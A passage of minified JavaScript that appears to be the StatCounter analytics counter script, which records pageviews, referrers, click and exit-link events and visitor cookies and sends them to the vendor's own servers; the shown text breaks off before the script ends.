var _statcounter = function(e) { var t = !1;

    function n(e, t) { for (var n = 0; n < t.length; n++)
            if (t[n] == e) return !0;
        return !1 }

    function r(e) { return n(e, [12225189, 11548023, 11878871, 12214659, 981359, 9560334, 6709687, 9879613, 4124138, 204609, 10776808, 11601825]) }

    function o(e) { return n(e, [12908464]) }

    function i(e) { return n(e, [12893815]) } try { var a, s, c = function(e, t) { u() ? document.writeln(e) : me.insertAdjacentHTML("afterend", e) },
            u = function(e) { return "invisible" !== e && (!1 === me || !me.insertAdjacentHTML) },
            d = function(e) { return n(e, [4344864, 4124138, 204609]) || e > ke },
            l = function(e) { return n(e, [204609, 4124138]) },
            f = function(e) { var t = !0; try { if ("object" == typeof JSON && JSON && "function" == typeof JSON.stringify && "function" == typeof JSON.parse && "sessionStorage" in window && "withCredentials" in new XMLHttpRequest || (t = !1), 1 === z("sc_project_config_" + e) && null !== z("sc_project_time_difference_" + e) && (t = !1), null !== z("sc_block_project_config_" + e) && (t = !1), t) { var n = U("sc_project_config_" + e, -1);
                        Ae = n ? "good" : "bad"; var r = z("sc_project_config_" + e);
                        t = -1 === r, Ae += r } } catch (e) { t = !1 } return t },
            p = function() { var e = "" + Me.referrer; return "undefined" != typeof sc_referer_scr08 && (e = sc_referer_scr08), e },
            g = function() { var e = "" + Me.title; return e = e.substring(0, 300), e = encodeURIComponent ? encodeURIComponent(e) : escape(e) },
            m = function() { var e = "" + Me.location; return "about:srcdoc" == e && (e = "" + document.baseURI), e = e.substring(0, 300), e = escape(e) },
            v = function() { return Le.screen.width },
            _ = function() { return Le.screen.height },
            h = function(e) { if (0 == Oe) { var t = "",
                        n = "",
                        r = ""; try { if ("undefined" != typeof performance) { var o = Math.round(performance.now());
                            t = "&sc_rum_e_s=" + ge + "&sc_rum_e_e=" + o, n = w(e, o - ge) } } catch (e) { t = "", n = "" } try { if ("undefined" != typeof performance)
                            for (var i = performance.getEntriesByType("resource"), a = 0; a < i.length; a++) { var s = i[a]; if (s.name.includes("statcounter.com/counter/counter.js") || s.name.includes("statcounter.com/counter/counter_test.js")) { r = "&sc_rum_f_s=" + Math.round(s.requestStart) + "&sc_rum_f_e=" + Math.round(s.responseEnd); break } } } catch (e) { r = "" } return t + n + r } return "" },
            w = function(e, t) { var n = ""; if (l(e) && "undefined" != typeof performance) { var r = document.getElementById("sc-ttfb-bd"),
                        o = "-1";
                    r && (o = r.textContent); var i = performance.timing.responseStart - performance.timing.connectStart,
                        a = document.getElementById("sc-perf-wh"),
                        s = 0;
                    a && (s = a.textContent); var c = document.getElementById("sc-perf-pn"),
                        u = 0;
                    c && (u = c.textContent); var d = document.getElementById("sc-perf-db"),
                        f = 0;
                    d && (f = d.textContent), n = "&sc_ev_scperf_js_exec=" + t + "&sc_ev_scperf_ttfb_frontend=" + i + "&sc_ev_scperf_ttfb_backend=" + o + "&sc_ev_scperf_ws=" + s + "&sc_ev_scperf_pn=" + u + "&sc_ev_scperf_db=" + f } return n },
            y = function(e, t) { t = (((t || "") + "").toLowerCase().match(/<[a-z][a-z0-9]*>/g) || []).join(""); return e.replace(/<!--[\s\S]*?-->|<\?(?:php)?[\s\S]*?\?>/gi, "").replace(/<\/?([a-z][a-z0-9]*)\b[^>]*>/gi, (function(e, n) { return t.indexOf("<" + n.toLowerCase() + ">") > -1 ? e : "" })) },
            b = function(e) { for (var t = 0; t < e.length; t++) e[t] = ("" + e[t]).trim(); return e },
            x = function(e) { var t = []; if (e.length % 2 != 0) t.push("Every tag must have a name and value.");
                else { e.length / 2 > 10 && t.push("No more than 10 tags can be passed - " + e.length / 2 + " passed."); for (var n = 0; n < e.length; n++) { var r = ("" + e[n]).length;
                        (r < 1 || r > 300) && t.push("Tag names and values must be between 1 and 300 characters in length ('" + e[n] + "' is " + e[n].length + " characters long).") } for (n = 0; n < e.length; n++) y("" + e[n]) != "" + e[n] && t.push("Tag names and values may not contain HTML tags.") } if (0 != t.length) { for (n = 0; n < t.length; n++); return !1 } return !0 },
            S = function(e) {
                function t(e, t) { var n = e.__proto__ || e.constructor.prototype; return t in e && (!(t in n) || n[t] !== e[t]) } if (Object.prototype.hasOwnProperty) var t = function(e, t) { return e.hasOwnProperty(t) }; var n = {}; if (t(e, "tags") && "object" == typeof e.tags) { var r = []; for (var o in e.tags) r[r.length] = o, r[r.length] = e.tags[o]; if (x(r)) { r = b(r); for (var i = 0; i < r.length; i += 2) n["sc_ev_" + encodeURIComponent(r[i])] = encodeURIComponent(r[i + 1]) } } return n },
            I = function(e) { var t, n = e.length,
                    r = this,
                    o = 0,
                    i = r.i = r.j = 0,
                    a = r.S = []; for (n || (e = [n++]); o < ot;) a[o] = o++; for (o = 0; o < ot; o++) a[o] = a[i = ct & i + e[o % n] + (t = a[o])], a[i] = t;
                (r.g = function(e) { for (var t, n = 0, o = r.i, i = r.j, a = r.S; e--;) t = a[o = ct & o + 1], n = n * ot + a[ct & (a[o] = a[i = ct & i + t]) + (a[i] = t)]; return r.i = o, r.j = i, n })(ot) },
            j = function(e, t) { var n, r = [],
                    o = (typeof e)[0]; if (t && "o" == o)
                    for (n in e) try { r.push(j(e[n], t - 1)) } catch (e) {}
                return r.length ? r : "s" == o ? e : e + "\0" },
            E = function(e, t) { for (var n, r = e + "", o = 0; o < r.length;) t[ct & o] = ct & (n ^= 19 * t[ct & o]) + r.charCodeAt(o++); return T(t) },
            k = function(e) { try { return window.crypto.getRandomValues(e = new Uint8Array(ot)), T(e) } catch (e) { return [+new Date, window, window.navigator.plugins, window.screen, T(rt)] } },
            T = function(e) { return String.fromCharCode.apply(0, e) },
            C = function() { var e, t = [],
                    n = { pdf: "application/pdf", qt: "video/quicktime", realp: "audio/x-pn-realaudio-plugin", wma: "application/x-mplayer2", dir: "application/x-director", fla: "application/x-shockwave-flash", java: "application/x-java-vm", gears: "application/x-googlegears", ag: "application/x-silverlight" },
                    r = new RegExp("Mac OS X.*Safari/").test(navigator.userAgent) && window.devicePixelRatio || 1; if (!new RegExp("MSIE").test(navigator.userAgent)) { if (navigator.mimeTypes && navigator.mimeTypes.length)
                        for (var o in n) Object.prototype.hasOwnProperty.call(n, o) && (e = navigator.mimeTypes[n[o]], t.push(e && e.enabledPlugin ? "1" : "0")); "unknown" != typeof navigator.javaEnabled && void 0 !== navigator.javaEnabled && navigator.javaEnabled() && t.push("java"), "function" == typeof window.GearsFactory && t.push("gears") } return t.push(screen.width * r + "x" + screen.height * r), t.join("") },
            N = function(e) { var t = new Date;
                void 0 === e && (e = 32); var n = Math.round(t.getTime() / 1e3) + t.getMilliseconds(),
                    r = (navigator.userAgent || "") + (navigator.platform || "") + C() + t.getTimezoneOffset() + window.innerWidth + window.innerHeight + window.screen.colorDepth + document.URL + n;
                ut(r); for (var o, i = "0123456789ABCDEF".split(""), a = new Array(e), s = 0, c = 0; c < e; c++) 12 == c ? a[c] = "4" : 13 == c ? a[c] = "F" : (s <= 2 && (s = 33554432 + 16777216 * tt() | 0), o = 15 & s, s >>= 4, a[c] = i[19 == c ? 3 & o | 8 : o]); return a.join("") },
            A = function() { var e = !1; if ("localStorage" in window) try { e = null !== window.localStorage } catch (e) { if (!(e.name && "quotaexceedederr" === e.name.toLowerCase().replace(/_/g, "").substring(0, 16) || e.number && -2147024891 === parseInt(e.number, 10))) throw e }
                return e },
            L = function(e, t, n) { if (A()) { try { "is_visitor_unique" === e ? localStorage.setItem("statcounter.com/localstorage/", t) : localStorage.setItem("statcounter_" + e, t) } catch (e) { if (!(e.name && "quotaexceedederr" === e.name.toLowerCase().replace(/_/g, "").substring(0, 16) || e.number && -2147024891 === parseInt(e.number, 10))) throw e; return !1 } return !0 } return !1 },
            M = function(e, t, n, r, o, i) { "string" == typeof t && (t = [t]), void 0 === r && (r = ""), void 0 === o && (o = 30); var a = !1; if ("localStorage" == Se)(a = L(e, r + t.join("-"))) ? null !== B(e) && J(e, n) : a = R(e, r + t.join("-"), n, void 0, i);
                else { var s = t.slice(0, o).join("-");
                    (a = R(e, r + s, n, void 0, i)) ? t.length > o ? L(e, "mx" + t.slice(o).join("-")) : D(e): a = L(e, r + t.join("-")) } return a },
            O = function(e, t) { var n = null; if (A() && (n = "is_visitor_unique" === e ? localStorage.getItem("statcounter.com/localstorage/") : localStorage.getItem("statcounter_" + e)), "localStorage" == Se && null !== n && "rx" == n.substring(0, 2)) return n; var r = B(e, t); if (null !== n) { if (null === r && "rx" == n.substring(0, 2)) return n;
                    null !== r && "mx" == n.substring(0, 2) && (r += "-" + n.substring(2)) } return r },
            D = function(e) { A() && ("is_visitor_unique" === e && localStorage.removeItem("statcounter.com/localstorage/"), localStorage.removeItem("statcounter_" + e)) },
            q = function(e, t) { D(e), B(e) && J(e, t) },
            B = function(e, t) { var n = "sc_" + e + "=",
                    r = null; if (Me.cookie)
                    for (var o = Me.cookie.split(";"), i = 0; i < o.length; i++) { for (var a = o[i];
                            " " == a.charAt(0);) a = a.substring(1, a.length); if (0 == a.indexOf(n)) { var s = a.substring(n.length, a.length);
                            r && void 0 !== t && -1 !== r.indexOf(t + ".") && -1 === s.indexOf(t + ".") || (r = s) } }
                return r },
            R = function(e, t, n, r, o) { var i = !1;
                void 0 === r ? i = 63072e6 : "session" !== r && (i = 1e3 * r); var a = ""; if (!1 !== i) { var s = new Date;
                    s.setTime(s.getTime() + i), a = "; expires=" + s.toGMTString() } var c = 3050;
                t.length > 3e3 && -1 !== t.substring(0, c).indexOf("-") && (t = t.substring(0, t.substring(0, c).lastIndexOf("-")));
                Me.cookie = "sc_" + e + "=" + t + a + "; domain=" + n + "; path=/; SameSite=Lax"; var u = B(e, o); return null !== u && u === t },
            J = function(e, t) { Me.location.host == "www" + t && (Me.cookie = "sc_" + e + "=; expires=Thu, 01 Jan 1970 00:00:01 GMT; domain=.www" + t + "; path=/; SameSite=Lax"), Me.cookie = "sc_" + e + "=; expires=Thu, 01 Jan 1970 00:00:01 GMT; domain=" + t + "; path=/; SameSite=Lax" },
            P = function() { var e = {}; try { null !== sessionStorage.getItem("statcounter_config") && (e = JSON.parse(sessionStorage.getItem("statcounter_config"))) } catch (t) { e = {} } return e },
            z = function(e) { if (!("sessionStorage" in window)) return null; var t = P(); if (void 0 !== t[e]) return t[e]; var n = null; try { n = sessionStorage.getItem(e) } catch (e) { return null } return null !== n ? (U(e, n), sessionStorage.removeItem(e), n) : null },
            U = function(e, t) { if (!("sessionStorage" in window)) return console.log("returning false"), !1; var n = P(); try { return n[e] = t, sessionStorage.setItem("statcounter_config", JSON.stringify(n)), !0 } catch (e) { return !1 } },
            H = function(e, t, n) { var r = "t.php",
                    a = ye; if (o(e) && (r = "t_static.php", a = "https://1ctest.statcounter.com/"), i(e) && (r = "counter_test.php", a = "https://1ctest.statcounter.com/"), "?" == t.substring(0, 1)) var s = a + r + t;
                else s = t;
                $(s += "&xhr_request=true", n) },
            $ = function(e, t, n) { var r = new XMLHttpRequest;
                r.onreadystatechange = function() { if (4 == this.readyState && 200 == this.status) { var e = JSON.parse(this.responseText);
                        t(e) } }, void 0 !== n && r.addEventListener("error", n), r.withCredentials = !0, r.open("GET", e, !0), r.send() },
            V = function(e, t, n) { a.get_config(t, (function(t) { U("sc_project_config_" + e, 1); var r = U("sc_project_time_difference_" + e, parseInt(t.time_difference)); if (Ne = r ? "true" : "false", Ce = t.time_difference, t.visitor_recording > 2 && U("heatmap_" + e, "on"), 1 === t.visitor_recording || 3 === t.visitor_recording) a.record(e);
                    else if (2 === t.visitor_recording || 4 === t.visitor_recording) a.record(e, "test");
                    else if (5 === t.visitor_recording || 6 === t.visitor_recording) a.record(e, "off");
                    else { var o = z("record_" + e);
                        o && -1 !== o.indexOf("dev") && dt(e) }
                    void 0 !== t.visitor_recording_unmask && U("sc_unmask_" + e, t.visitor_recording_unmask), void 0 !== n && n(t) })) },
            W = function(e, t) { var n = e.split("."),
                    r = t.split("."),
                    o = Math.min(n.length, r.length),
                    i = 2;
                n.length > 1 && (n[n.length - 2].length <= 3 && n[n.length - 1] in { at: 1, au: 1, br: 1, es: 1, hu: 1, il: 1, nz: 1, tr: 1, uk: 1, us: 1, za: 1 } || "kr" == n[n.length - 1] || "ru" == n[n.length - 1] || "au" == n[n.length - 1] && n[n.length - 2] in { csiro: 1 } || "at" == n[n.length - 1] && n[n.length - 2] in { priv: 1 } || "fr" == n[n.length - 1] && n[n.length - 2] in { avocat: 1, aeroport: 1, veterinaire: 1 } || "hu" == n[n.length - 1] && n[n.length - 2] in { film: 1, lakas: 1, ingatlan: 1, sport: 1, hotel: 1 } || "nz" == n[n.length - 1] && n[n.length - 2] in { geek: 1, kiwi: 1, maori: 1, school: 1, govt: 1, health: 1, parliament: 1 } || "il" == n[n.length - 1] && n[n.length - 2] in { muni: 1 } || "za" == n[n.length - 1] && n[n.length - 2] in { school: 1 } || "tr" == n[n.length - 1] && n[n.length - 2] in { name: 1 } || "uk" == n[n.length - 1] && n[n.length - 2] in { police: 1 }) && (i = 3); for (var a = 1; a <= o; a++) { if (n[n.length - a] != r[r.length - a]) return !1; if (a >= i) return !0 } return n.length == r.length },
            X = function(e, t) { if ("" == t) return "d"; var n = t.split("/")[2].replace(/^www\./, ""),
                    r = Me.location.host.replace(/^www\./, ""); if (d(e) && (r == n || W(n, r))) return "internal"; if (-1 !== t.search(/\bgoogle\..*\?.*adurl=http/)) return "p"; for (var o = ["utm_source=bing", "?gclid=", "&gclid=", "utm_medium=cpc", "utm_medium=paid-media", "utm_medium=ppc"], i = 0; i < o.length; i++)
                    if (-1 !== Me.location.search.indexOf(o[i])) return "p";
                var a = ["utm_medium=email"]; for (i = 0; i < a.length; i++)
                    if (-1 !== Me.location.search.indexOf(a[i])) return "e";
                if (!d(e) && r == n) return "internal"; for (var s in lt)
                    if (-1 !== n.replace(s, "#").split(".").indexOf("#")) { if (null === lt[s]) return s; for (i = 0; i < lt[s].length; i++) { var c = lt[s][i]; if (-1 !== t.indexOf("?" + c + "=") || -1 !== t.indexOf("&" + c + "=")) return s } }
                for (var u in ft)
                    for (i = 0; i < ft[u].length; i++) { s = ft[u][i]; if (-1 !== n.replace(s, "#").split(".").indexOf("#")) return u }
                return n },
            F = function(e) { return "d" == e || "p" == e || "e" == e || "internal" == e ? e : e in lt ? "o" : e in ft ? "s" : "r" },
            G = function(e) { if (window.sc_counter_width && window.sc_counter_height) var t = ' width="' + sc_counter_width + '" height="' + sc_counter_height + '"'; var n = "StatCounter - Free Web Tracker and Counter"; return window.sc_remove_alt && (n = ""), '<img src="' + e + '" alt="' + n + '" border="0"' + t + ">" },
            Y = function(e, t, n) { var r = { u1: "za" },
                    o = f(e); try { Ie = Date.now() } catch (e) {} if (gt[e] = (new Date).getTime(), window !== Le) { if (void 0 === Le.sc_top_reg && (Le.sc_top_reg = {}), void 0 !== Le.sc_top_reg[e]) return void dt(e);
                    Le.sc_top_reg[e] = 1 } var i = {}; if (!d(e)) { var s = X(e, pt),
                        c = F(s); "internal" != s && (i.rcat = c, i.rdom = s) } var u = Math.round((new Date).getTime() / 1e3); if ("disabled" != Se) { if (d(e)) { s = X(e, pt), c = F(s); "internal" != s && (i.rcat = c, i.rdom = s) } try { var l = JSON.parse(localStorage.getItem("sc_medium_source"));
                        null == l && (l = {}); var p = null,
                            g = null,
                            v = null,
                            _ = 0; for (var h in l) {
                            (null === p || l[h] > l[p]) && (p = h); var w = F(h);
                            c == w && (null === g || l[h] > l[g]) && (g = h), "r" == w && (null === v || l[h] < l[v]) && (v = h), _ += 1 }
                        _ > 30 && null !== v && delete l[v], sessionStorage.getItem("statcounter_bounce") && (sessionStorage.removeItem("statcounter_bounce"), i.bb = 0); var y = 30; if (d(e) || (y = 15), "d" == s && null !== p && "d" != p && u - l[p] < 60 * y && (s = "internal"), d(e) && (sessionStorage.getItem("statcounter_session") && u - parseInt(sessionStorage.getItem("statcounter_session"), 10) < 1800 && (s = "internal"), sessionStorage.setItem("statcounter_session", u)), d(e) || "r" == c && sessionStorage.getItem("statcounter_exit_domain") == s && (s = "internal"), "internal" == s) null !== p && (i.rcat = F(p), void 0 !== i.rdom && delete i.rdom, i.rdomo = p, i.rdomg = u - l[p], l[p] = u);
                        else { var b = !1;
                            s in l ? (s == p && void 0 !== i.rdom && (i.rdomo = i.rdom, delete i.rdom), i.rdomg = u - l[s], u - l[s] < 1800 && (b = !0)) : i.rdomg = "new", void 0 === i.bb && !b && (sessionStorage.setItem("statcounter_bounce", "1"), i.bb = 1), null !== g && (!(s in l) || s != g) && (i.rcatg = u - l[g]), l[s] = u } try { localStorage.setItem("sc_medium_source", JSON.stringify(l)) } catch (t) { d(e) && (i = {}) } } catch (t) { d(e) && (i = {}) } for (var x in i) n[x] = i[x]; if (void 0 !== i.rdom) var I = !0;
                    else I = !1; var j = a.update_cookie(e, u, I); if (j.session_incremented) { var E = z("record_" + e);
                        E && !E.match(/(^test$|wsdev$|^dev[0-9]*)/) && (o = !0, U("sc_project_time_difference_" + e, !1)) }
                    a._session_increment_calculated[e] = !0, n.jg = j.jg, n.rr = j.rr, void 0 !== j.u1 && (r.u1 = j.u1) } if ("[object Array]" === Object.prototype.toString.call(a._pending_tags) && a._pending_tags.length >= 1) { var k = S(a._pending_tags[0]); for (var x in k) n[x] = k[x] }
                a._pending_tags = {}, K(e, t, o, r, n), pt = m(), dt(e) },
            K = function(e, t, n, r, s) { r.java = 1, r.security = a._security_codes[e], r.sc_snum = le, r.sess = a.version(); var u = ye; if ("text" == t) u += "text.php?";
                else { var d = "t.php";
                    o(e) && (d = "t_static.php", u = "https://1ctest.statcounter.com/"), i(e) && (d = "counter_test.php", u = "https://1ctest.statcounter.com/"), u += d + "?" } for (var l in 999 !== e ? u += "sc_project=" + e : window.usr && (u += "usr=" + window.usr), r) u += "&" + l + "=" + r[l];
                s.resolution = v(), s.h = _(), s.camefrom = pt.substring(0, 600), s.u = m(), s.t = g(), "invisible" == t ? s.invisible = "1" : "text" == t && (s.text = window.sc_text); var f = ""; for (var l in s) f += "&" + l + "=" + s[l]; if ("invisible" == t) { var p = !1; "" != xe && "object" == typeof JSON && JSON && "function" == typeof JSON.stringify && "sessionStorage" in window && (p = !0); var w = !1; if (p) try { var y = sessionStorage.getItem("statcounter_pending"); if (y) try { var b = JSON.parse(y) } catch (e) { b = {} } else b = {};
                        void 0 === b[e] && (b[e] = {}); var x = (new Date).getTime(); for (b[e][x] = f;;) { if ("{}" == (y = JSON.stringify(b))) { sessionStorage.removeItem("statcounter_pending"); break } if (y.split(/:.{20}/).length - 1 < 20) { var S = !0; try { sessionStorage.setItem("statcounter_pending", y) } catch (e) { if (!e.name || "quotaexceedederr" !== e.name.toLowerCase().replace(/_/g, "").substring(0, 16)) throw e;
                                    S = !1 } if (S) break } var I = !1,
                                j = !1,
                                E = !1; for (var k in b)
                                for (var T in b[k]) { var C = /jg=(\d+)/.exec(b[k][T]); if (null !== C) var N = parseInt(C[1]);
                                    else N = !1;
                                    (!1 === I || !1 !== N && N < I) && (!1 !== N && (I = N), j = k, E = T) }
                            if (!1 === E) break;
                            delete b[j][E], "{}" == JSON.stringify(b[j]) && delete b[j] } for (var A in b[e]) ! function(t, r) { var o = b[r][t];

                            function i() { void 0 !== b[r] && (delete b[r][t], "{}" == JSON.stringify(b[r]) && delete b[r]); var e = JSON.stringify(b); "{}" == e ? sessionStorage.removeItem("statcounter_pending") : sessionStorage.setItem("statcounter_pending", e) } var a = u + o; if (t != x ? a += "&pg=" + Math.round((x - t) / 1e3) : (w = !0, a += h(e)), n) V(e, a, (function(e) { i() }));
                            else if (navigator.sendBeacon) navigator.sendBeacon(a, ""), i();
                            else { var s = new Image;
                                s.onload = i, s.src = a + "&sc_random=" + Math.random() } }(parseInt(A, 10), e) } catch (e) {}
                    if (!p || !w) { var L = u + h(e) + f; if (n) V(e, L);
                        else if (navigator.sendBeacon) navigator.sendBeacon(L, "");
                        else {
                            (new Image).src = L + "&sc_random=" + Math.random() } } } else { L = u + h(e) + f; var M = "sc_counter_" + e; if (1 != le && (M += "_" + le), "text" == t) { var O = function(e) { if (e.text) document.getElementById(M).innerHTML = e.text;
                            else if (e.counter_image) { var t = G(e.counter_image);
                                document.getElementById(M).innerHTML = t } };
                        n ? (c('<span class="statcounter" id="' + M + '"></span>'), V(e, L, O)) : (c('<span class="statcounter" id="' + M + '"></span>'), H(e, L, O)) } else { if (window.sc_remove_link) var D = "",
                            q = "";
                        else D = '<a id="' + M + '" class="statcounter" href="https://www.' + be + '/" target="_blank">', q = "</a>";
                        n ? (c('<span class="statcounter">' + D + "Statcounter" + q + "</span>"), V(e, L, (function(e) { var t = G(e.counter_image);
                            document.getElementById(M).innerHTML = t }))) : (L += "&sc_random=" + Math.random(), c('<span class="statcounter">' + D + G(L.replace(/&/g, "&amp;")) + q + "</span>")) } }
                Oe++ },
            Q = function(e) { var t = function() { for (var e in a._security_codes) te(parseInt(e, 10), this); return !0 };
                e.addEventListener ? e.addEventListener("mousedown", t) : e.attachEvent && e.attachEvent("onmousedown", t) },
            Z = function() {},
            ee = function() { if (window.sc_click_stat) var e = window.sc_click_stat;
                else e = 0; for (var t = (n = new Date).getTime() + e; n.getTime() < t;) var n = new Date },
            te = function(e, t, n) { var r = new RegExp("\\.(" + je + ")$", "i"),
                    o = new RegExp("^(https?|ftp|telnet|ssh|ssl|mailto|spotify|zoommtg|zoomus|slack|skype|callto|bitcoin|gtalk|tel):", "i"),
                    i = new RegExp("^(ac|co|gov|ltd|me|mod|net|nic|nhs|org|plc|police|sch|com)$", "i"),
                    s = location.host.replace(/^www\./i, "").split("."),
                    c = s.pop(),
                    u = s.pop();
                i.test(u) && (c = u + "." + c, u = s.pop()), c = u + "." + c; var l = new RegExp("^https?://(.*)(" + c + "|webcache.googleusercontent.com)", "i"); if (t) { var f = 0; if (o.test(t) ? l.test(t) ? r.test(t) ? f = 1 : (!1 !== Ee && Ee.test(t) || 2 == we) && (f = 2) : f = 2 : !0 === n && (f = 2), 0 != f) { var p = escape(t); if (p.length > 0) { if (!d(e) && 2 == f && "disabled" != Se && o.test(t)) try { sessionStorage.setItem("statcounter_exit_domain", p.split("/")[2].replace(/^www\./, "")) } catch (e) {}
                            var v = ye + "click.gif?sc_project=" + e + "&security=" + a._security_codes[e] + "&c=" + p + "&m=" + f + "&u=" + m() + "&t=" + g() + "&sess=" + a.version() + "&rand=" + Math.random(),
                                _ = Math.round((new Date).getTime() / 1e3),
                                h = a.update_cookie(e, _);
                            void 0 !== h.u1 && (v += "&u1=" + h.u1), v += "&jg=" + h.jg, v += "&rr=" + h.rr; var w = new Image;
                            w.onload = Z, w.src = v, a._add_recording_event && a._add_recording_event(1 == f ? "download" : 2 == f ? "exit" : "unknown", { link: unescape(p) }), ee() } } } },
            ne = function(e, t) { if (t.src.match(wt)) var n = escape(t.src);
                else n = escape("Google Adsense " + t.width + "x" + t.height); var r = ye + "click.gif?sc_project=" + e + "&security=" + a._security_codes[e] + "&c=" + n + "&m=2&u=" + m() + "&t=" + g() + "&sess=" + a.version() + "&rand=" + Math.random(),
                    o = Math.round((new Date).getTime() / 1e3),
                    i = a.update_cookie(e, o);
                (void 0 !== i.u1 && (r += "&u1=" + i.u1), r += "&jg=" + i.jg, r += "&rr=" + i.rr, navigator.sendBeacon) ? navigator.sendBeacon(r, ""): ((new Image).src = r, ee());
                a._add_recording_event && a._add_recording_event("adsense", { link: unescape(n) }) },
            re = function(e) { var t = e.defaultView,
                    n = /iPad|iPhone|iPod/.test(navigator.userAgent) && !window.MSStream,
                    r = /Firefox/.test(navigator.userAgent) && /Android/.test(navigator.userAgent); if (n || r)
                    for (var o = e.getElementsByTagName("iframe"), i = 0; i < o.length; i++) "aswift" == o[i].id.substring(0, 6) && o[i].addEventListener("mouseenter", (function(e) { for (var t in a._security_codes) ne(parseInt(t, 10), this) }));
                else if (e.all && void 0 === window.opera)
                    for (o = e.getElementsByTagName("iframe"), i = 0; i < o.length; i++)(o[i].src.match(wt) || o[i].id.match(yt)) && (o[i].onfocus = function() { for (var e in a._security_codes) ne(parseInt(e, 10), this) });
                else if (void 0 !== window.addEventListener) { "beforeunload", t && (t.focus(), t.addEventListener("blur", (function() { var t = e.activeElement;
                        _t = t, ht = (new Date).getTime() })), t.addEventListener("beforeunload", ce, !1), t.addEventListener("mousemove", ie, !0)) } },
            oe = function() { var e = navigator.userAgent,
                    t = e.indexOf("MSIE "); if (t > 0) return 10 >= parseInt(e.substring(t + 5, e.indexOf(".", t)), 10); if (e.indexOf("Trident/") > 0) { var n = e.indexOf("rv:"); return 11 >= parseInt(e.substring(n + 3, e.indexOf(".", n)), 10) } return !1 },
            ie = function(e) { "number" == typeof e.pageX ? (mt = e.pageX, vt = e.pageY) : "number" == typeof e.clientX && (mt = e.clientX, vt = e.clientY, Me.body && (Me.body.scrollLeft || Me.body.scrollTop) ? (mt += Me.body.scrollLeft, vt += Me.body.scrollTop) : Me.documentElement && (Me.documentElement.scrollLeft || Me.documentElement.scrollTop) && (mt += Me.documentElement.scrollLeft, vt += Me.documentElement.scrollTop)) },
            ae = function(e) { for (var t = 0; e;) t += e.offsetTop, e = e.offsetParent; return t },
            se = function(e) { for (var t = 0; e;) t += e.offsetLeft, e = e.offsetParent; return t },
            ce = function(e) { var t = Me.getElementsByTagName("iframe"); if (void 0 !== mt)
                    for (var n = 0; n < t.length; n++) { var r = se(t[n]),
                            o = ae(t[n]),
                            i = parseInt(r, 10) + parseInt(t[n].width, 10) + 15,
                            s = parseInt(o, 10) + parseInt(t[n].height, 10) + 10; if (vt > o - 10 && vt < s && (mt > r - 10 && mt < i) && (t[n].src.match(wt) || t[n].id.match(yt)))
                            for (var c in a._security_codes) ne(parseInt(c, 10), t[n]) }
                if (void 0 !== _t && "aswift" == _t.id.substring(0, 6) && (new Date).getTime() - ht < 300)
                    for (var c in a._security_codes) ne(parseInt(c, 10), _t) },
            ue = function(e) { var t = !1; for (var n in a._security_codes) { var o = parseInt(n, 10);
                    (r(o) || 12718861 == o || 12537497 == o) && (t = !0) } if (t) try { var i = function(e) { try { if (1 !== e.nodeType) return;
                            ("a" == e.tagName.toLowerCase() || "area" == e.tagName.toLowerCase() && "function" == typeof e.hasAttribute && e.hasAttribute("href")) && Q(e), e.hasChildNodes() && e.childNodes.forEach(i) } catch (e) {} };
                    new MutationObserver((function(e) { try { e.forEach((function(e) { return e.addedNodes.forEach(i) })) } catch (e) {} })).observe(e.body, { subtree: !0, childList: !0 }) } catch (e) {} },
            de = function(e) { for (var t = e.defaultView, n = function() { re(e) }, r = e.getElementsByTagName("a"), o = e.getElementsByTagName("area"), i = 0; i < r.length; i++) { var a = r[i];
                    Q(a) } for (i = 0; i < o.length; i++) { "function" == typeof(a = o[i]).hasAttribute && a.hasAttribute("href") && Q(a) } if (ue(e), void 0 !== window.addEventListener) t.addEventListener("load", n, !1);
                else if (void 0 !== e.addEventListener) e.addEventListener("load", n, !1);
                else if (void 0 !== window.attachEvent) t.attachEvent("onload", n);
                else if ("function" == typeof window.onload) { var s = onload;
                    t.onload = function() { s(), n() } } else t.onload = n },
            le = 1,
            fe = !1,
            pe = {}; try { if (pe = new Proxy(new URLSearchParams(window.location.search), { get: function(e, t) { return e.get(t) } }), pe._heatmap && pe._heatmap.match("^(dev[^.]+.)?statcounter$") && (fe = !0, s = "https://" + pe._heatmap + ".com", pe.test_heatmap)) return window.parent.postMessage({ ok: !0 }, "https://" + pe.test_heatmap), { record_pageview: function() {} } } catch (qe) {}
        void 0 !== e && e.record_pageview ? le = (a = e)._get_script_num() + 1 : (void 0 === e ? (a = function() {})._pending_tags = {} : (e.start_recording ? (a = e, e._pageview_tags_in && (e = e._pageview_tags_in)) : a = function() {}, "[object Array]" === Object.prototype.toString.call(e) ? a._pending_tags = e : a._pending_tags = {}), a._session_increment_calculated = {}, a._returning_values = {}, a._security_codes = {}), a.push = function(e) { a._pending_tags = [e] }; var ge = !1; if ("undefined" != typeof performance) try { ge = Math.round(performance.now()) } catch (qe) { ge = !1 }
        var me = !1,
            ve = !1; if (document.currentScript && document.currentScript.src) { try { me = document.currentScript } catch (qe) { var _e = document.getElementsByTagName("script"); if (_e.length)
                    for (var he = _e.length - 1; he >= 0; he--)
                        if (-1 !== _e[he].src.indexOf("/counter")) { me = _e[he]; break } } if (me) try { "statcounter.com" === new URL(me.src).host.replace(/www\.|dev.[0-9]+\./, "") && (ve = me.src) } catch (qe) {} } var we = -1,
            ye = "",
            be = "statcounter.com",
            xe = "",
            Se = "cookie",
            Ie = !1,
            je = "7z|aac|avi|csv|doc|docx|exe|flv|gif|gz|jpe?g|js|mp(3|4|e?g)|mov|pdf|phps|png|ppt|rar|sit|tar|torrent|txt|wma|wmv|xls|xlsx|xml|zip"; "string" == typeof window.sc_download_type && (je = window.sc_download_type); var Ee = !1; "string" == typeof window.sc_exit_link_detect && (Ee = new RegExp(sc_exit_link_detect, "i")), window.sc_client_storage && (Se = window.sc_client_storage), void 0 !== window.sc_first_party_cookie && "0" == sc_first_party_cookie && (Se = "disabled"), window.sc_click_stat && (we = window.sc_click_stat), window.sc_local ? ye = sc_local : (-1 == we && (we = 1), ye = "https://c." + be + "/"), window.sc_project && (t = parseInt(window.sc_project, 10), window.sc_security ? a._security_codes[t] = sc_security : void 0 === a._security_codes[t] && (a._security_codes[t] = "")); var ke = 9e6,
            Te = [30, 60, 120, 180, 360, 720, 1440, 2880, 10080],
            Ce = "ntd",
            Ne = "ntd",
            Ae = "ntd";
        a.get_top_window = function() { for (var e = window; e.parent && e.parent !== e;) try { e.parent.document;
                e = e.parent } catch (e) { break }
            return e }; var Le = a.get_top_window(),
            Me = Le.document;
        a.get_referrer = p; var Oe = 0;
